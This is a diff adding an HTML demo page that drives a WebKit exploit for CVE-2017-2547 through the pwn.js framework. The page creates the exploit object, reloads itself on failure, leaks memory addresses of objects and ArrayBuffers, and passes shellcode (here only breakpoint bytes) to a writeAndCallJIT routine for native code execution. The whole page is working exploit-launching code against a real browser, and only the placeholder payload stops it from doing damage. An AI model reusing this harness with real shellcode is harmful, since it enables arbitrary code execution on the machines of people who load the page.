@@ -1,0 +1,27 @@
+<!doctype html>
+<html>
+    <body>
+        <pre id="content"></pre>
+
+        <script src="../dist/pwn.js"></script>
+        <script src="webkit-CVE-2017-2547.js"></script>
+        <script>
+            function log(s) { document.getElementById('content').innerHTML += s + '<br>'; }
+
+            try {
+                var exploit = new Exploit();
+            } catch(e) {
+                log('Exploit failed: ' + e + '. Refreshing.');
+                document.location.href = document.location.href;
+            }
+
+            with (exploit) {
+                alert("foo : " + addressOf( {a:1} ).toString(16));
+                alert("bar : " + addressOfArrayBuffer(new Uint32Array(0x10)).toString(16));
+
+                var shellcode = [ 0xCC, 0xCC, 0xCC, 0xCC ];
+                writeAndCallJIT(shellcode);
+            }
+        </script>
+    </body>
+</html>
